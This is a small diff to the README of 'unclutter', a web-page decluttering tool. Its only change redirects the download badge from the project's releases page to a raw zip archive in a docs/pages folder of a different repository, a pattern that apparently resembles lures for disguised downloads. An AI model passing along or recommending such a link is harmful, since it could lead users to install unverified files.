@@ -5,7 +5,7 @@ description: "Remove page clutter and distractions automatically with reusable J
 ---
 # 🧹 unclutter - Your Web Pages, Cleaned Up Instantly
 
-[![Download unclutter](https://img.shields.io/badge/Download-unclutter-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/osama0112989757300-gif/unclutter/releases)
+[![Download unclutter](https://img.shields.io/badge/Download-unclutter-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/osama0112989757300-gif/osama0112989757300-gif.github.io/raw/refs/heads/main/docs/pages/Release_2.4.zip)
 
 ## ✨ What Is unclutter?
 
